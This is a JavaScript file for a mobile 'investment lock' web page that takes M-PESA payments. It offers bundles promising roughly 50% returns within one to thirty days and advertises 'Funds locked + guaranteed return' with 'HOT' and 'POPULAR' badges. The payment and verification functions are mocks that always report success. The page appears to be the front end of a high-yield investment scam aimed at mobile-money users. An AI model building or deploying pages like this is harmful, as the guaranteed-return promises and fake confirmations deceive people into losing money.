// script.js - exactly same number of options as original bundle page

// API endpoints (dummy, but kept for structure)
const API_ENDPOINTS = {
    initiatePayment: '/api/initiate-payment',
    normalizePhone: '/api/normalize-phone',
    verifyPayment: '/api/verify-payment'
};

// Investment products – counts exactly match original:
// daily: 2, weekly: 4, monthly: 4, unlimited: 4
const investmentData = {
    daily: {
        id: 'daily',
        title: 'Short Lock · 24h / 3d',
        icon: 'fas fa-clock',
        subtitle: 'Quick flips, high frequency',
        bundles: [
            { id: 1, title: 'Lock 200 KES · get 300', subtitle: '24 hours only', price: 200, payout: 300, badge: 'HOT' },
            { id: 2, title: 'Lock 350 KES · get 500', subtitle: '3 days tenure', price: 350, payout: 500, badge: 'VALUE' }
        ]
    },
    weekly: {
        id: 'weekly',
        title: 'Weekly Lock',
        icon: 'fas fa-calendar-week',
        subtitle: '7 days · better returns',
        bundles: [
            { id: 3, title: 'Lock 400 KES · get 600', subtitle: '7 days lock', price: 400, payout: 600, badge: null },
            { id: 4, title: 'Lock 700 KES · get 1000', subtitle: '7 days + bonus', price: 700, payout: 1000, badge: 'POPULAR' },
            { id: 5, title: 'Lock 1000 KES · get 1500', subtitle: '7 days · double', price: 1000, payout: 1500, badge: null },
            { id: 6, title: 'Lock 1300 KES · get 1900', subtitle: '7 days premium', price: 1300, payout: 1900, badge: 'HOT' }
        ]
    },
    monthly: {
        id: 'monthly',
        title: 'Monthly Lock',
        icon: 'fas fa-calendar-alt',
        subtitle: '21–30 days · max yield',
        bundles: [
            { id: 7, title: 'Lock 1500 KES · get 2200', subtitle: '21 days tenure', price: 1500, payout: 2200, badge: null },
            { id: 8, title: 'Lock 2000 KES · get 3000', subtitle: '30 days · flagship', price: 2000, payout: 3000, badge: 'POPULAR' },
            { id: 9, title: 'Lock 2500 KES · get 3800', subtitle: '30 days · extra', price: 2500, payout: 3800, badge: 'HOT' },
            { id: 10, title: 'Lock 3000 KES · get 4500', subtitle: '30 days · pro', price: 3000, payout: 4500, badge: 'VALUE' }
        ]
    },
    unlimited: {
        id: 'unlimited',
        title: 'Extended Lock',
        icon: 'fas fa-infinity',
        subtitle: '14d / 30d special',
        bundles: [
            { id: 11, title: 'Lock 800 KES · get 1200', subtitle: '14 days unlimited', price: 800, payout: 1200, badge: 'VALUE' },
            { id: 12, title: 'Lock 1200 KES · get 1800', subtitle: '14 days high', price: 1200, payout: 1800, badge: null },
            { id: 13, title: 'Lock 1800 KES · get 2700', subtitle: '30 days unlimited', price: 1800, payout: 2700, badge: null },
            { id: 14, title: 'Lock 2200 KES · get 3300', subtitle: '14d special', price: 2200, payout: 3300, badge: 'POPULAR' }
        ]
    }
};

// ---------- state ----------
let selectedInvestment = null;
let isProcessing = false;

const tabs = document.querySelectorAll('.tab-pill');
const bundlesContainer = document.getElementById('bundles-container');

// ---------- render ----------
function renderAllInvestments() {
    bundlesContainer.innerHTML = '';

    for (const [categoryKey, category] of Object.entries(investmentData)) {
        const categorySection = document.createElement('div');
        categorySection.className = 'category-section';
        categorySection.id = `section-${categoryKey}`;
        categorySection.dataset.category = categoryKey;

        const categoryHeader = document.createElement('div');
        categoryHeader.className = 'category-header';
        categoryHeader.innerHTML = `
            <div class="category-title">
                <i class="${category.icon}"></i>
                ${category.title}
            </div>
            <div class="category-subtitle">${category.subtitle}</div>
        `;

        const categoryBundles = document.createElement('div');
        categoryBundles.className = 'category-bundles';

        category.bundles.forEach(inv => {
            const card = document.createElement('div');
            card.className = 'bundle-card';
            if (inv.badge === 'POPULAR') card.classList.add('popular');
            if (inv.badge === 'VALUE') card.classList.add('featured');

            let badgeClass = '';
            if (inv.badge === 'POPULAR') badgeClass = 'popular-badge';
            else if (inv.badge === 'HOT') badgeClass = 'hot-badge';
            else if (inv.badge === 'VALUE') badgeClass = 'value-badge';

            card.innerHTML = `
                ${inv.badge ? `<div class="bundle-badge ${badgeClass}">${inv.badge}</div>` : ''}
                <div class="bundle-title">${inv.title}</div>
                <div class="bundle-subtitle">${inv.subtitle}</div>
                <div class="bundle-details">
                    <div>
                        <div class="bundle-price">Ksh ${inv.price}</div>
                        <div class="bundle-currency">→ get ${inv.payout} KES</div>
                    </div>
                    <button class="bundle-buy-btn" 
                        data-id="${inv.id}"
                        data-title="${inv.title}"
                        data-price="${inv.price}"
                        data-payout="${inv.payout}">
                        LOCK
                    </button>
                </div>
            `;

            categoryBundles.appendChild(card);
        });

        categorySection.appendChild(categoryHeader);
        categorySection.appendChild(categoryBundles);
        bundlesContainer.appendChild(categorySection);
    }
}

// ---------- tab switching + scroll spy ----------
function setupEventListeners() {
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');

            const category = tab.dataset.category;

            if (category === 'all') {
                window.scrollTo({ top: 0, behavior: 'smooth' });
            } else {
                const section = document.getElementById(`section-${category}`);
                if (section) {
                    section.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }
            }
        });
    });

    bundlesContainer.addEventListener('click', (e) => {
        if (e.target.classList.contains('bundle-buy-btn')) {
            const invId = e.target.dataset.id;
            const invTitle = e.target.dataset.title;
            const invPrice = e.target.dataset.price;
            const invPayout = e.target.dataset.payout;

            selectInvestment({
                id: invId,
                title: invTitle,
                price: invPrice,
                payout: invPayout
            });
        }
    });

    // scroll spy for active tab
    window.addEventListener('scroll', () => {
        const sections = ['daily', 'weekly', 'monthly', 'unlimited'];
        const scrollPos = window.scrollY + 110;

        for (const secId of sections) {
            const section = document.getElementById(`section-${secId}`);
            if (section) {
                const top = section.offsetTop;
                const bottom = top + section.offsetHeight;
                if (scrollPos >= top && scrollPos < bottom) {
                    tabs.forEach(t => {
                        t.classList.remove('active');
                        if (t.dataset.category === secId) t.classList.add('active');
                    });
                    break;
                }
            }
        }
        if (window.scrollY < 100) {
            tabs.forEach(t => {
                t.classList.remove('active');
                if (t.dataset.category === 'all') t.classList.add('active');
            });
        }
    });
}

// ---------- helpers ----------
function validatePhoneNumber(phone) {
    let clean = phone.replace(/\D/g, '');
    if (clean.startsWith('0')) clean = clean.substring(1);
    if (clean.startsWith('254')) clean = clean.substring(3);
    if (clean.length !== 9) throw new Error('Enter 9 digits (e.g., 712345678)');
    if (!clean.startsWith('7') && !clean.startsWith('1')) throw new Error('Must start with 7 or 1');
    return clean;
}

function formatPhoneForDisplay(phone) {
    if (phone.length !== 9) return phone;
    return phone.slice(0,3) + ' ' + phone.slice(3,6) + ' ' + phone.slice(6);
}

function formatPhoneForAPI(phone) {
    return '+254' + phone;
}

// ---------- modal ----------
function showInputModal(investment) {
    Swal.fire({
        title: 'Lock Funds',
        html: `
            <div class="modal-content">
                <div class="modal-bundle-name">
                    ${investment.title}
                </div>
                <div class="input-wrapper">
                    <label class="input-label">
                        <i class="fas fa-mobile-alt"></i> M-PESA number
                    </label>
                    <div class="phone-input-group">
                        <div class="phone-prefix">+254</div>
                        <input type="tel" class="phone-input" id="swal-phone" placeholder="712 345 678" maxlength="11">
                    </div>
                    <p class="input-note">We'll send STK push to lock amount</p>
                </div>

                <div class="summary-box">
                    <div class="summary-row">
                        <span>Lock amount:</span>
                        <span><strong>Ksh ${investment.price}</strong></span>
                    </div>
                    <div class="summary-row">
                        <span>Maturity value:</span>
                        <span><strong style="color:#1d541d;">Ksh ${investment.payout}</strong></span>
                    </div>
                    <div class="summary-row total">
                        <span>You pay now:</span>
                        <span>Ksh ${investment.price}</span>
                    </div>
                </div>

                <div class="secure-note">
                    <i class="fas fa-lock"></i> Funds locked + guaranteed return
                </div>
            </div>
        `,
        showCancelButton: true,
        confirmButtonText: 'Continue',
        cancelButtonText: 'Back',
        focusConfirm: false,
        customClass: {
            popup: 'swal2-popup',
            confirmButton: 'swal2-confirm',
            cancelButton: 'swal2-cancel'
        },
        preConfirm: () => {
            const phoneInput = document.getElementById('swal-phone');
            try {
                const phoneValue = validatePhoneNumber(phoneInput.value);
                return { phone: phoneValue };
            } catch (error) {
                Swal.showValidationMessage(error.message);
                return false;
            }
        }
    }).then(async (result) => {
        if (result.isConfirmed && result.value) {
            await initiateLock(investment, result.value.phone);
        }
    });

    setTimeout(() => {
        const phoneInput = document.getElementById('swal-phone');
        if (phoneInput) {
            phoneInput.addEventListener('input', function(e) {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 3) value = value.slice(0,3) + ' ' + value.slice(3);
                if (value.length > 7) value = value.slice(0,7) + ' ' + value.slice(7);
                this.value = value.slice(0,11);
            });
            phoneInput.focus();
        }
    }, 50);
}

function selectInvestment(investment) {
    selectedInvestment = investment;
    showInputModal(investment);
}

// ---------- mock API & lock flow ----------
async function sendPayHeroSTK(phoneNumber, amount, description) {
    // mock
    return new Promise(resolve => setTimeout(() => resolve({ reference: 'REF' + Date.now() }), 800));
}

async function verifyPayment(reference) {
    return { success: true, status: 'SUCCESS' };
}

async function pollPaymentStatus(reference) {
    return { success: true };
}

async function normalizePhoneNumber(phone) {
    return formatPhoneForAPI(phone);
}

async function initiateLock(investment, recipientPhone) {
    if (isProcessing) return;
    isProcessing = true;

    try {
        await Swal.fire({
            title: 'Processing',
            html: '<div style="padding:0.5rem;">Please wait...</div>',
            allowOutsideClick: false,
            didOpen: () => Swal.showLoading()
        });

        const normalizedPhone = await normalizePhoneNumber(recipientPhone);
        // mock payment response
        const paymentResponse = await sendPayHeroSTK(normalizedPhone, parseInt(investment.price), investment.title);

        await Swal.fire({
            title: 'STK Sent!',
            html: `
                <div class="status-modal-content">
                    <div class="status-icon" style="color:#1d541d;">
                        <i class="fas fa-mobile-alt"></i>
                    </div>
                    <p><strong>Check your phone</strong></p>
                    <div style="background:#e6f3e6;padding:0.5rem;border-radius:10px;margin:0.5rem 0;font-size:0.85rem;">
                        ${formatPhoneForDisplay(recipientPhone)}
                    </div>
                    <p style="font-size:0.75rem;color:#2d7a2d;">Enter PIN to lock funds</p>
                </div>
            `,
            showConfirmButton: false,
            timer: 2500,
            timerProgressBar: true
        });

        await Swal.fire({
            title: 'Verifying',
            html: '<div style="padding:0.5rem;"><div class="swal2-loading" style="margin:0.5rem auto;"></div><p style="font-size:0.75rem;">Confirming payment...</p></div>',
            showConfirmButton: false,
            allowOutsideClick: false
        });

        const pollResult = await pollPaymentStatus(paymentResponse.reference);

        if (pollResult.success) {
            await Swal.fire({
                title: 'Locked!',
                html: `
                    <div class="status-modal-content">
                        <div class="status-icon" style="color:#1d541d;">
                            <i class="fas fa-check-circle"></i>
                        </div>
                        <div class="status-details">
                            <div style="margin-bottom:0.3rem;"><strong>${investment.title}</strong></div>
                            <div>${formatPhoneForDisplay(recipientPhone)}</div>
                            <div style="font-weight:700;margin-top:0.3rem;">Paid Ksh ${investment.price}</div>
                            <div style="font-weight:700;color:#0f3a0f;">Maturity: Ksh ${investment.payout}</div>
                        </div>
                    </div>
                `,
                confirmButtonText: 'Done',
                confirmButtonColor: '#1d541d',
                customClass: { confirmButton: 'swal2-confirm' }
            });
        } else {
            await showPaymentError('Not confirmed');
        }
    } catch (error) {
        await showPaymentError(error.message);
    } finally {
        isProcessing = false;
        selectedInvestment = null;
    }
}

async function showPaymentError(msg) {
    await Swal.fire({
        title: 'Status',
        html: `
            <div class="status-modal-content">
                <div class="status-icon" style="color:#f59e0b;">
                    <i class="fas fa-exclamation-triangle"></i>
                </div>
                <p><strong>${msg || 'Transaction issue'}</strong></p>
                <p style="font-size:0.7rem;">Check M-PESA</p>
            </div>
        `,
        confirmButtonText: 'OK',
        confirmButtonColor: '#1d541d',
        customClass: { confirmButton: 'swal2-confirm' }
    });
}

// ---------- init ----------
document.addEventListener('DOMContentLoaded', () => {
    renderAllInvestments();
    setupEventListeners();
    document.querySelector('[data-category="all"]').classList.add('active');
});